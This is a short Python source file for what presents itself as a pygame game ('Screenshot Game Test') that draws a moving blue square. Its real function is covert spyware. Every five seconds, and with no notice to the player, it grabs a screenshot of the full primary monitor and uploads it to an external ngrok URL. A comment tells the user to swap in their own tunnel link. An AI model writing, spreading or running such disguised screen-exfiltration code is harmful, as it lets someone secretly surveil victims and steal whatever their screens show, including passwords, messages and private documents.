import pygame
import requests
import mss
from PIL import Image
import time

# ==========================
# INITIAL SETUP
# ==========================
pygame.init()
screen = pygame.display.set_mode((800, 600))
pygame.display.set_caption("Screenshot Game Test")
clock = pygame.time.Clock()

# Colors
BLUE = (0, 0, 255)
WHITE = (255, 255, 255)

# ==========================
# SCREENSHOT + UPLOAD
# ==========================
def take_screenshot():
    """Capture the screen and save as screenshot.png"""
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        img.save("screenshot.png")

def send_screenshot():
    """Send screenshot to external server"""
    try:
        with open("screenshot.png", "rb") as f:
            files = {'file': f}
            # 🔹 REPLACE THIS with your actual ngrok HTTPS link
            response = requests.post("https://plenipotent-molal-averi.ngrok-free.dev", files=files)
            print("Server response:", response.text)
    except Exception as e:
        print("Error sending screenshot:", e)

# ==========================
# MAIN GAME LOOP
# ==========================
def mains():
    x = 50
    last_screenshot_time = time.time()

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        # Draw background and moving rectangle
        screen.fill(WHITE)
        pygame.draw.rect(screen, BLUE, (x, 250, 100, 100))
        x += 2
        if x > 800:
            x = -100

        # Update display
        pygame.display.flip()
        clock.tick(60)

        # Take and send screenshot every 5 seconds
        if time.time() - last_screenshot_time > 5:
            take_screenshot()
            send_screenshot()
            last_screenshot_time = time.time()

    pygame.quit()

if __name__ == "__main__":
    mains()
